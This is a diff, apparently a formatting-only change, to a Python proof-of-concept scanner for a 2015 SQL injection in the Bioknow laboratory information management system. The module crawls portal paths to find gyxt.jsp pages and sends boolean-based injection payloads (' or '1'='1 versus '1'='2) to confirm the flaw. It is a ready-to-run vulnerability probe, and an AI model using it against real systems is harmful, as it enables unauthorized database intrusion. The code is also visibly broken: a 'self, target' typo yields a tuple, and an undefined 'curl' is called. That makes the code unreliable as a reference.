@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Bioknow_0001' # 平台漏洞编号，留空
+    vuln_id = 'Bioknow_0001'  # 平台漏洞编号，留空
     name = '百奥知实验室综合信息管理系统 SQL注射'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-04-08'  # 漏洞公布时间
     desc = '''
         百奥知实验室综合信息管理系统：
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     product = '百奥知实验室综合信息管理系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 def matchurl(arg):
     hh = hackhttp.hackhttp()
     arg = arg + '/portal/'
@@ -29,16 +31,19 @@ def matchurl(arg):
     m = re.findall('/portal/root/(.*?)/', res)
     m1 = []
     for data in m:
-        if data in m1:pass
-        else :m1.append(data)
-     
-    urllist = []  
+        if data in m1:
+            pass
+        else:
+            m1.append(data)
+
+    urllist = []
     for data in m1:
         url = arg + '/root/' + data + '/gyxt.jsp'
         code, head, res, errcode, _ = curl.curl2(url)
-        if code ==200 :
+        if code == 200:
             urllist.append(url)
     return urllist
+
 
 class Poc(ABPoc):
     poc_id = '75a687be-f7c8-4364-9c9e-018a44d84202'
@@ -52,9 +57,9 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0106048
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0108186
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0106048
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0108186
             hh = hackhttp.hackhttp()
             arglist = matchurl(self.target)
             for arg in arglist:
@@ -66,7 +71,7 @@ class Poc(ABPoc):
                     payload1 = payload + '%27%20or%20%271%27=%271'
                     payload2 = payload + '%27%20or%20%271%27=%272'
                     url1 = self.target + payload1
-                    url2 = self,target + payload2
+                    url2 = self, target + payload2
                     code1, head, res1, errcode, _ = hh.http(url1)
                     code2, head, res2, errcode, _ = hh.http(url2)
                     m1 = re.findall('src', res1)
@@ -81,6 +86,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
